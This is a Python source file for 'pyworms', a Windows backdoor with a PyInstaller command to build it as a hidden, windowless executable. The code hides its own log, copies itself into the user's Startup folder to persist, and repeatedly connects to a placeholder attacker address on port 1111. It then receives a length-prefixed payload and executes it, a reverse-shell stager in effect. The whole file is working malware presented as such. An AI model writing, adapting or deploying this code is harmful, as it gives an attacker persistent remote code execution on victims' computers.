"""
pyinstaller --onefile --hidden-import=socket --hidden-import=struct --hidden-import=time --hidden-import=getpass --hidden-import=os --hidden-import=sys --hidden-import=shutil --hidden-import=code --hidden-import=platform -w pyworms.py 
"""

import socket,struct,time,getpass,os,logging,sys,win32api,win32con
from shutil import copyfile

username=""
LOG_FILENAME = "pyworms.log"
logging.basicConfig(filename=LOG_FILENAME,level=logging.DEBUG)

try:
	win32api.SetFileAttributes(LOG_FILENAME,win32con.FILE_ATTRIBUTE_HIDDEN)
except Exception as e:
    logging.exception("HIDE EXCEPTION")
logging.debug("Setting log file hidden ... Done !")
logging.debug('Starting pyworms ... Done !')

try:
	userName = getpass.getuser()
except Exception as e:
    logging.exception("USER EXCEPTION")
logging.debug('Fetching username ... : %s',userName)
logging.debug('Fetching startup folder ... Done !')
startup_path= 'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' %userName
if os.path.exists(startup_path):
	logging.debug("Startup folder: " + startup_path)
else:
	logging.debug('Path not exist !')

self_path = "pyworms.exe"
logging.debug('Try to copy pyworms into startup folder ... ')
file_path = startup_path+ "\\pyworms.exe"

try:
	if os.path.exists(file_path):
		logging.debug('File is already here !')
	else:
		copyfile(self_path, file_path)
   		logging.debug('Done !')
except Exception as e:
    logging.exception("COPY EXCEPTION")
logging.debug('Try to open connection with the hacker ...')

try:
	s=socket.socket(2,socket.SOCK_STREAM)
	while s.connect_ex(("x.x.x.x", 1111)) != 0:
		time.sleep(10)
    	logging.debug('Waiting ... ')
	logging.debug('Done !')
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(l)
	while len(d)<l:
		d+=s.recv(l-len(d))
	exec(d,{'s':s})
except Exception as e:
    logging.exception("NETWORK EXCEPTION")
